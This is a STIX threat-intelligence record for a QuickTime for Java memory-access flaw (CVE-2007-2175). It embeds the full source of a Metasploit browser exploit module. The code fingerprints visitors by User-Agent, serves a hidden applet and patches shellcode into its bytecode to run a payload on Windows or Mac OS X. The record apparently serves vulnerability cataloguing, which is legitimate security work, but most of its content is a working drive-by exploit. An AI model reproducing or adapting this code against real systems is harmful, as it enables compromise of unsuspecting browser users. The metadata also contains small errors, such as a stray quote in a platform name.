{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c42f0afc-19c1-4ad7-bc36-ca4a2415146a",
    "created": "2024-08-14T17:05:59.206259Z",
    "modified": "2024-08-14T17:05:59.206263Z",
    "name": "Apple QTJava toQTPointer() Arbitrary Memory Access",
    "description": " This module exploits an arbitrary memory access vulnerability in the Quicktime for Java API provided with Quicktime 7.   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/qtjava_pointer.rb",
            "external_id": "qtjava_pointer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2175"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QTJava toQTPointer() Arbitrary Memory Access',\n      'Description'    => %q{\n        This module exploits an arbitrary memory access vulnerability in the\n      Quicktime for Java API provided with Quicktime 7.\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'hdm',           # Original exploit for Mac OS X PPC / Win32\n        'kf',            # Added support for Mac OS X X86\n        'ddz'            # Discovered bug, provided tips\n      ],\n      'References'     =>\n        [\n          ['CVE',    '2007-2175'],\n          ['OSVDB', '34178'],\n          ['BID',    '23608'],\n          ['ZDI',    '07-023'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => ''\n        },\n      'Platform'       => %w{ win osx },\n      'Targets'        =>\n        [\n#\n# Problem with generic payloads + regenerate_payload still :(\n#\n#\t\t\t\t\t[ 'Quicktime 7 Automatic',\n#\t\t\t\t\t\t{\n#\t\t\t\t\t\t\t'Platform' => ['win', 'osx'],\n#\t\t\t\t\t\t\t'Arch' => [ARCH_X86, ARCH_PPC]\n#\t\t\t\t\t\t}\n#\t\t\t\t\t],\n          [ 'Quicktime 7 on Windows x86',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Quicktime 7 on Mac OS X PPC',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC,\n            }\n          ],\n          [ 'Quicktime 7 on Mac OS X x86',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n#\t\t\t'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-04-23'\n      ))\n  end\n\n\n  def exploit\n    # load the class data\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"QTJavaExploit.class\")\n    fd = File.open(path, \"rb\")\n    @class_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n\n  def on_request_uri(cli, req)\n\n    # Create a cached mapping between IP and detected target\n    @targetcache ||= {}\n    @targetcache[cli.peerhost] ||= {}\n    @targetcache[cli.peerhost][:update] = Time.now.to_i\n\n    if (target.name =~ /Automatic/)\n      case req.headers['User-Agent']\n      when /Windows/i\n        print_status(\"Choosing a Windows target\")\n        @targetcache[cli.peerhost][:target] = self.targets[1]\n      when /PPC Mac OS X/i\n        print_status(\"Choosing a Mac OS X PPC target\")\n        @targetcache[cli.peerhost][:target] = self.targets[2]\n      when /Intel Mac OS X/i\n        print_status(\"Choosing a Mac OS X x86 target\")\n        @targetcache[cli.peerhost][:target] = self.targets[3]\n      end\n    end\n\n    # Clean the cache\n    rmq = []\n    @targetcache.each_key do |addr|\n      if (Time.now.to_i > @targetcache[addr][:update]+60)\n        rmq.push addr\n      end\n    end\n\n    rmq.each {|addr| @targetcache.delete(addr) }\n\n\n    # Request processing\n\n    if (not req.uri.match(/\\.class$/i))\n\n      # Redirect to the base directory so the applet code loads...\n      if (not req.uri.match(/\\/$/))\n        send_redirect(cli, get_resource() + '/', '')\n        return\n      end\n\n      # Display the applet loading HTML\n      print_status(\"Sending HTML\")\n      send_response_html(cli, generate_html(), { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    # Send the actual applet over\n    print_status(\"Sending applet\")\n    send_response(cli, generate_applet(cli, req), { 'Content-Type' => 'application/octet-stream' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_html()\n    return \"<html><head></head><body><applet width='1' height='1' code='QTJavaExploit.class'></applet></body></html>\"\n  end\n\n  def generate_applet(cli, req)\n\n    this_target = nil\n    if (target.name =~ /Automatic/)\n      if (@targetcache[cli.peerhost][:target])\n        this_target = @targetcache[cli.peerhost][:target]\n      else\n        return ''\n      end\n    else\n      this_target = target\n    end\n\n    # make a copy..\n    data = @class_data.dup\n\n    # 1 = OSX PPC, 2 = OSX X86, 3 = WIN X86\n    idx_targ = data.index(\"\\x03\\x10\\xcc\\x54\")\n\n    # 1024 bytes for shellcode\n    idx_code = data.index(\"\\x03\\x10\\xf0\\x54\")\n\n    # Handle Mac OS X PPC\n    if (this_target.arch.include?(ARCH_PPC))\n      tp = regenerate_payload(cli, 'osx', ARCH_PPC, this_target)\n      data = patch_bytecode(idx_code, data, tp.encoded)\n      data = patch_bytecode(idx_targ, data, \"\\x01\")\n    end\n\n    # Handle Mac OS X x86 / Windows x86\n    if (this_target.arch.include?(ARCH_X86))\n\n      if (this_target.platform.platforms.include?(Msf::Module::Platform::Windows))\n        tp = regenerate_payload(cli, 'win', ARCH_X86, this_target)\n        data = patch_bytecode(idx_code, data, tp.encoded)\n        data = patch_bytecode(idx_targ, data, \"\\x03\")\n      end\n\n      if (this_target.platform.platforms.include?(Msf::Module::Platform::OSX))\n        tp = regenerate_payload(cli, 'osx', ARCH_X86, this_target)\n        data = patch_bytecode(idx_code, data, tp.encoded)\n        data = patch_bytecode(idx_targ, data, \"\\x02\")\n      end\n    end\n\n    return data\n  end\n\n  def patch_bytecode(off, data, buff)\n\n    cnt = 0\n    off -= 1\n    while (cnt < buff.length)\n      cnt += 1\n      while (! (data[off-1] == 0x10 && data[off+1] == 0x54))\n        off += 1\n      end\n      data[off]=buff[cnt-1]\n      off += 1\n    end\n\n    return data\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2007-04-23",
    "x_mitre_platforms": [
        "osx'"
    ]
}